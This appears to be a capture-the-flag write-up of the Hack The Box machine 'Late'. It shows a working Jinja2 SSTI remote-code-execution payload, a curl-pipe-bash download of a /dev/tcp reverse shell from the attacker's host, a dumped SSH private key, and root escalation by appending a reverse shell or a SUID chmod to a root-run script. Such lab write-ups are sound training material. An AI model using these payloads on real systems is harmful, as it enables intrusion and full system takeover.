# Machine Synopsis

Late is an Easy Linux machine that features a Server Side Template Injection (SSTI) vulnerability in a text reading application, which leads to Remote Code Execution as user `svc_acc`. Enumeration for files owned by this user reveals a script that is executed whenever an SSH connection to the system is initiated or dropped. This script runs as the `root` user, however, enumeration of the file attributes show that it cannot be directly edited, but data can be appended. A reverse shell can be added at the end of this script in order to gain a shell as `root`. ([Source](https://www.hackthebox.com/machines/late))

Here is their website.

![website](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/Late/website.png?raw=true)

Looking around the website, we can find a hyperlinked text that points to `http://images.late.htb/`. Lets add this subdomain to our `/etc/hosts` file.

![images_website](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/Late/images_website.png?raw=true)

As we can see from the website, there are 2 important information - the website is running on `Flask` and it is converting an image to text.

Lets convert a text to image using this [tool](https://smallseotools.com/text-to-image/). As a test, I used the text `Shiro`. Thereafter, I uploaded the image to the flask application and it returned a text file containing the following content.

```bash
┌──(root㉿shiro)-[/home/shiro/HackTheBox/Late]
└─# cat /home/shiro/Downloads/results.txt 
<p>Shiro
</p>     
```

# Exploitation

Since this was a Flask application, we should check whether it is vulnerable to SSTI. To test this, I used a payload text of `{{1+1}}`. Here was the result.

```bash
┌──(root㉿shiro)-[/home/shiro/HackTheBox/Late]
└─# cat /home/shiro/Downloads/results\(1\).txt
<p>2
</p>        
```

>   Note that the flask application might not read the image properly. To bypass this, we can either make the text wider with spaces in between the payload like `{ { 1 + 1 } }` and/or change the zoom level!

Nice. The application is vulnerable to SSTI. Lets use our handy [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection) to try out some payloads. I tried different payloads but this seems to work the best - `{{ cycler.__init__.__globals__.os.popen('id').read() }}`.

```bash
┌──(root㉿shiro)-[/home/shiro/HackTheBox/Late]
└─# cat /home/shiro/Downloads/results\(2\).txt 
<p>uid=1000(svc_acc) gid=1000(svc_acc) groups=1000(svc_acc)

</p>  
```

>   Note: I used this [tool](https://cloudconvert.com/txt-to-jpg) to convert the text to image instead as it seems to be more reliable than the previous tool.

Here’s our plan. 

-   We create a simple reverse shell script and host the script on our own server 
-   Modify the SSTI payload that we found with this command - `curl http://10.10.14.4/rev.sh | bash`
-   Start a netcat listener
-   Upload the image to the application and wait for the listener to catch the shell

```bash
┌──(root㉿shiro)-[/home/shiro/HackTheBox/Late]
└─# cat rev.sh                                
#!/bin/bash

bash -c 'exec bash -i &>/dev/tcp/10.10.14.4/1234 <&1'

- Netcat Listener -                                   
┌──(root㉿shiro)-[/home/shiro/HackTheBox/Late]

>   The SSTI payload used: `{{ cycler.__init__.__globals__.os.popen('curl http://10.10.14.4/rev.sh | bash').read() }}`
>
>   Note: Depending on the error that the application throws while reading the payload, you have to modify it such as adding extra “_” in the payload. 

# Privilege Escalation

Before we begin, we should grab the `id_rsa` file for easier access using `ssh`!

```bash
svc_acc@late:~/app$ cat ~/.ssh/id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAqe5XWFKVqleCyfzPo4HsfRR8uF/P/3Tn+fiAUHhnGvBBAyrM
...
kxruFUgLHh7nEx/5/0r8gmcoCvFn98wvUPSNrgDJ25mnwYI0zzDrEw==
-----END RSA PRIVATE KEY-----

┌──(root㉿shiro)-[/home/shiro/HackTheBox/Late]
└─# mousepad id_rsa    
< copy & paste the private key here >

┌──(root㉿shiro)-[/home/shiro/HackTheBox/Late]
└─# chmod 600 id_rsa    

┌──(root㉿shiro)-[/home/shiro/HackTheBox/Late]
└─# ssh svc_acc@10.10.11.156 -i id_rsa
Warning: SSH client configured for wide compatibility by kali-tweaks.
svc_acc@late:~$ 
```

Lets try `su -` to see if we can get an easy win.

```bash
svc_acc@late:~$ su -
Password: 
```

Lets check if `svc_acc` can run any command as root.

```bash
svc_acc@late:~$ sudo -l
[sudo] password for svc_acc: 
```

Lets try if we can find any interesting files owned by `svc_acc`.

```bash
svc_acc@late:~$ find / -user svc_acc 2>/dev/null
...
< too much information being printed >
^C

svc_acc@late:~$ find / -user svc_acc 2>/dev/null | grep -v '/proc\|/home\|/var\|/sys\|/run'
/usr/local/sbin
/usr/local/sbin/ssh-alert.sh
/dev/pts/0
svc_acc@late:~$ cat /usr/local/sbin/ssh-alert.sh
#!/bin/bash

RECIPIENT="root@late.htb"
SUBJECT="Email from Server Login: SSH Alert"

BODY="

        User:        $PAM_USER
        User IP Host: $PAM_RHOST
        Service:     $PAM_SERVICE
        TTY:         $PAM_TTY
        Date:        `date`
        Server:      `uname -a`
"

if [ ${PAM_TYPE} = "open_session" ]; then
        echo "Subject:${SUBJECT} ${BODY}" | /usr/sbin/sendmail ${RECIPIENT}
fi
```

There is an interesting `ssh-alert.sh` file that is available but is it executed by root? Lets use `pspy` to check.

```bash
- Local Machine -
┌──(root㉿shiro)-[/home/shiro/HackTheBox/Late]
└─# wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64
...

- Netcat Shell -
svc_acc@late:~$ wget http://10.10.14.4/pspy64
...
svc_acc@late:~$ chmod +x pspy64
svc_acc@late:~$ ./pspy64
...
< ssh into svc_acc again using another terminal to execute the ssh-alert script >
...
2022/08/20 08:08:22 CMD: UID=0    PID=1922   | /bin/bash /usr/local/sbin/ssh-alert.sh 
```

The script is indeed ran by `UID=0`. 

```bash
svc_acc@late:~$ lsattr /usr/local/sbin/ssh-alert.sh 
-----a--------e--- /usr/local/sbin/ssh-alert.sh
```

>   `lsattr` shows the attribute of the file. The `a` in the attributes indicate that we can only add things to the end of the file.

Lets add a reverse shell bash script to the end of the file and execute `ssh-alert.sh`.

```bash
svc_acc@late:~$ echo 'bash -c "exec bash -i &>/dev/tcp/10.10.14.4/9999 <&1"' >> /usr/local/sbin/ssh-alert.sh 
svc_acc@late:~$ cat /usr/local/sbin/ssh-alert.sh 
#!/bin/bash

RECIPIENT="root@late.htb"
SUBJECT="Email from Server Login: SSH Alert"

BODY="

        User:        $PAM_USER
        User IP Host: $PAM_RHOST

        TTY:         $PAM_TTY
        Date:        `date`
        Server:      `uname -a`
"

if [ ${PAM_TYPE} = "open_session" ]; then
        echo "Subject:${SUBJECT} ${BODY}" | /usr/sbin/sendmail ${RECIPIENT}
fi


bash -c "exec bash -i &>/dev/tcp/10.10.14.4/9999 <&1"
```

Finally, we can start another netcat listener and execute the script.

```bash
┌──(root㉿shiro)-[/home/shiro/HackTheBox/Late]
└─# nc -nlvp 9999            
listening on [any] 9999 ...

```

Reading a writeup from [Shakugan](https://shakuganz.com/2022/07/07/hackthebox-late/), I realized that there was another interesting way to get the root shell which is to set `/bin/bash` to SUID.

```bash
svc_acc@late:~$ echo "chmod u+s /bin/bash" >> /usr/local/sbin/ssh-alert.sh 
svc_acc@late:~$ bash -p
bash-4.4# id
uid=1000(svc_acc) gid=1000(svc_acc) euid=0(root) groups=1000(svc_acc)
```
